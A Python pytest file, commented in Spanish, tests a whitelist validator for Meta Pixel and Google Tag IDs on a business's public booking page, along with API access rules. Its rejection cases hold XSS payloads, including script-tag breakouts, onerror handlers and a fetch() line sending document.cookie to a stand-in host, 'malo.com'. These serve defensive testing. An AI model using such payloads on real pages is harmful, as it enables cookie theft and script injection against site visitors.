"""Regresión del fix-018: Meta Pixel y Google Tag.

Dos cosas distintas:

  1. LA DEFENSA ANTI-XSS QUE NO TENÍA UN SOLO TEST. Los IDs de pixel y tag
     terminan escritos DENTRO de un <script> en la vidriera pública — la
     página donde los clientes dejan su nombre y su teléfono. La lista blanca
     que los valida estaba bien escrita y era completamente indefensa ante la
     próxima edición: nada iba a avisar si alguien la aflojaba.

  2. GOOGLE ADS NO CONTABA NI UNA CONVERSIÓN. El panel invita a pegar un tag
     AW- y el evento que se disparaba era `generate_lead`, que va a Analytics.
     Ads necesita su propio evento con el par AW-XXXX/etiqueta en el send_to,
     y la etiqueta no se pedía en ningún lado.
"""

import pytest
from pydantic import ValidationError

from app.models import Empresa
from app.schemas.empresa import SeguimientoConfig
from app.services import empresa as svc

from .conftest import token_de


# ══════════════════════════════════════════════════════════════════════════
#  1. La lista blanca: lo que sí entra
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize("pixel", ["123456", "1234567890123456", "12345678901234567890"])
def test_un_pixel_de_meta_valido_pasa(pixel):
    assert SeguimientoConfig(meta_pixel_id=pixel).meta_pixel_id == pixel


@pytest.mark.parametrize(
    "tag,esperado",
    [
        ("G-ABC1234", "G-ABC1234"),
        ("AW-123456789", "AW-123456789"),
        ("GT-XYZ9876", "GT-XYZ9876"),
        ("UA-12345-1", "UA-12345-1"),
        # Se normaliza a mayúsculas: Google los emite así y el dueño los pega
        # de cualquier forma.
        ("g-abc1234", "G-ABC1234"),
    ],
)
def test_un_tag_de_google_valido_pasa(tag, esperado):
    assert SeguimientoConfig(google_tag_id=tag).google_tag_id == esperado


def test_vacio_queda_en_none():
    """Dejar el campo vacío es como se desconecta el seguimiento."""
    c = SeguimientoConfig(meta_pixel_id="  ", google_tag_id="")
    assert c.meta_pixel_id is None
    assert c.google_tag_id is None


# ══════════════════════════════════════════════════════════════════════════
#  2. La lista blanca: LO QUE NO ENTRA (esto es lo que importa)
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "veneno",
    [
        # Cerrar la comilla e inyectar. Es EL ataque contra un valor que se
        # escribe adentro de un <script>.
        "123456');alert(1);//",
        "123456'});fetch('https://malo.com?c='+document.cookie);//",
        "</script><script>alert(1)</script>",
        "123456<img src=x onerror=alert(1)>",
        "123456\\';alert(1);//",
        # Salto de línea: rompe la línea del script y escribe la suya.
        "123456\nalert(1)",
        # Formatos que simplemente no son un pixel.
        "abcdef",
        "12345",              # muy corto
        "1" * 21,             # muy largo
        "123 456",
        "+123456",
    ],
)
def test_ningun_pixel_raro_llega_al_script(veneno):
    """Un ID mal formado adentro de un <script> es XSS en la página donde el
    cliente deja su teléfono. La lista blanca es cerrada a propósito."""
    with pytest.raises(ValidationError):
        SeguimientoConfig(meta_pixel_id=veneno)


@pytest.mark.parametrize(
    "veneno",
    [
        "G-ABC');alert(1);//",
        "AW-123');fetch('https://malo.com');//",
        "</script><script>alert(1)</script>",
        "G-ABC<img src=x onerror=alert(1)>",
        "G-ABC\nalert(1)",
        "XX-1234567",         # prefijo que no existe
        "G-ABC",              # muy corto
        "G-" + "A" * 31,      # muy largo
        "javascript:alert(1)",
    ],
)
def test_ningun_tag_raro_llega_al_script(veneno):
    with pytest.raises(ValidationError):
        SeguimientoConfig(google_tag_id=veneno)


@pytest.mark.parametrize(
    "veneno",
    [
        "AbC-D');alert(1);//",
        "</script><script>alert(1)</script>",
        "etiqueta con espacios",
        "corta",              # menos de 6
        "A" * 41,             # más de 40
        "etiqueta/con/barras",
    ],
)
def test_ninguna_etiqueta_rara_llega_al_script(veneno):
    """La etiqueta va en el mismo <script> y tiene el mismo riesgo."""
    with pytest.raises(ValidationError):
        SeguimientoConfig(google_conversion_label=veneno)


# ══════════════════════════════════════════════════════════════════════════
#  3. La etiqueta de conversión de Google Ads
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "label", ["AbC-D_efG-h12_34-567", "abc123", "A_B-c9", "x" * 40]
)
def test_una_etiqueta_valida_pasa(label):
    assert SeguimientoConfig(google_conversion_label=label).google_conversion_label == label


def test_la_etiqueta_NO_se_pasa_a_mayusculas():
    """Google las genera distinguiendo mayúsculas: cambiarlas la rompe, y el
    negocio vería cero conversiones sin ninguna pista de por qué."""
    c = SeguimientoConfig(google_conversion_label="AbC-D_efG")
    assert c.google_conversion_label == "AbC-D_efG"


def test_con_un_tag_de_ads_la_etiqueta_se_guarda(client, db, armar_empresa):
    ctx = armar_empresa()

    r = client.put(
        "/empresa/seguimiento",
        json={
            "meta_pixel_id": None,
            "google_tag_id": "AW-123456789",
            "google_conversion_label": "AbC-D_efG-h12",
        },
        headers=token_de(ctx.dueno),
    )

    assert r.status_code == 200
    assert r.json()["google_conversion_label"] == "AbC-D_efG-h12"
    db.refresh(ctx.empresa)
    assert ctx.empresa.google_conversion_label == "AbC-D_efG-h12"


def test_con_un_tag_de_analytics_la_etiqueta_se_limpia(client, db, armar_empresa):
    """Una etiqueta colgada de un tag que ya no es de Ads dispararía contra
    una conversión que no existe el día que el negocio vuelva a Ads."""
    ctx = armar_empresa()
    client.put(
        "/empresa/seguimiento",
        json={
            "meta_pixel_id": None,
            "google_tag_id": "AW-123456789",
            "google_conversion_label": "AbC-D_efG-h12",
        },
        headers=token_de(ctx.dueno),
    )

    r = client.put(
        "/empresa/seguimiento",
        json={
            "meta_pixel_id": None,
            "google_tag_id": "G-ABC1234",
            "google_conversion_label": "AbC-D_efG-h12",
        },
        headers=token_de(ctx.dueno),
    )

    assert r.status_code == 200
    assert r.json()["google_conversion_label"] is None
    db.refresh(ctx.empresa)
    assert ctx.empresa.google_conversion_label is None


# ══════════════════════════════════════════════════════════════════════════
#  4. Por la API, de punta a punta
# ══════════════════════════════════════════════════════════════════════════


def test_el_dueno_conecta_y_desconecta(client, db, armar_empresa):
    ctx = armar_empresa()

    conectar = client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": "1234567890123456", "google_tag_id": "G-ABC1234"},
        headers=token_de(ctx.dueno),
    )
    assert conectar.status_code == 200
    assert conectar.json()["meta_pixel_id"] == "1234567890123456"

    desconectar = client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": None, "google_tag_id": None},
        headers=token_de(ctx.dueno),
    )
    assert desconectar.json()["meta_pixel_id"] is None
    assert desconectar.json()["google_tag_id"] is None


def test_un_pixel_con_veneno_se_rechaza_por_la_api(client, db, armar_empresa):
    """El control de arriba pero por la puerta de entrada real."""
    ctx = armar_empresa()

    r = client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": "123456');alert(1);//", "google_tag_id": None},
        headers=token_de(ctx.dueno),
    )

    assert r.status_code == 422
    db.refresh(ctx.empresa)
    assert ctx.empresa.meta_pixel_id is None


def test_recepcion_no_puede_tocar_el_seguimiento(client, db, armar_empresa):
    ctx = armar_empresa()
    r = client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": "1234567890", "google_tag_id": None},
        headers=token_de(ctx.profesional),
    )
    assert r.status_code == 403


def test_una_empresa_no_ve_el_pixel_de_otra(client, db, armar_empresa):
    a = armar_empresa("Barbería A")
    b = armar_empresa("Barbería B")
    client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": "1111111111", "google_tag_id": None},
        headers=token_de(a.dueno),
    )

    r = client.get("/empresa/seguimiento", headers=token_de(b.dueno))
    assert r.json()["meta_pixel_id"] is None


# ══════════════════════════════════════════════════════════════════════════
#  5. La vidriera pública
# ══════════════════════════════════════════════════════════════════════════


def test_la_vidriera_publica_expone_los_tres_datos(client, db, armar_empresa):
    """El navegador los necesita para armar los scripts. Son públicos por
    naturaleza: un pixel ID se ve en el HTML de cualquier página que lo use."""
    ctx = armar_empresa()
    ctx.empresa.meta_pixel_id = "1234567890123456"
    ctx.empresa.google_tag_id = "AW-123456789"
    ctx.empresa.google_conversion_label = "AbC-D_efG"
    ctx.empresa.activa = True
    db.flush()

    r = client.get(f"/publico/{ctx.empresa.slug}")

    assert r.status_code == 200
    datos = r.json()
    assert datos["meta_pixel_id"] == "1234567890123456"
    assert datos["google_tag_id"] == "AW-123456789"
    assert datos["google_conversion_label"] == "AbC-D_efG"


def test_una_empresa_sin_seguimiento_no_expone_nada(client, db, armar_empresa):
    """Sin pixel no hay cookies de terceros, y por eso tampoco hay banner."""
    ctx = armar_empresa()
    r = client.get(f"/publico/{ctx.empresa.slug}")
    assert r.json()["meta_pixel_id"] is None
    assert r.json()["google_tag_id"] is None
    assert r.json()["google_conversion_label"] is None


def test_el_pixel_guardado_sobrevive_a_otros_guardados(client, db, armar_empresa):
    """Guardar la landing no puede desconectar el pixel."""
    ctx = armar_empresa()
    client.put(
        "/empresa/seguimiento",
        json={"meta_pixel_id": "9999999999", "google_tag_id": None},
        headers=token_de(ctx.dueno),
    )

    svc.config_senas(db, ctx.empresa.id)
    db.refresh(ctx.empresa)
    assert ctx.empresa.meta_pixel_id == "9999999999"


def test_el_modelo_acepta_una_etiqueta_larga(db, armar_empresa):
    """La columna es de 60 y el validador corta en 40: no puede haber un
    valor válido que no entre en la base."""
    ctx = armar_empresa()
    empresa = db.get(Empresa, ctx.empresa.id)
    empresa.google_conversion_label = "x" * 40
    db.flush()
    db.refresh(empresa)
    assert len(empresa.google_conversion_label) == 40
